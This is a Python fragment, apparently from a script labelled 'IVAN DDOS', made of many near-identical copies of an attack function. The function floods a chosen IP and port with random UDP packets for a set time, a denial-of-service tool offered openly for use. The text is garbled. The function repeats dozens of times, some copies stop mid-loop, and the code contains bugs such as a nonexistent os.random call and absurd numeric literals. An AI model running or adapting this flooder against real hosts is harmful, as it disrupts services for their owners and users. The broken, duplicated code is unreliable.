        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
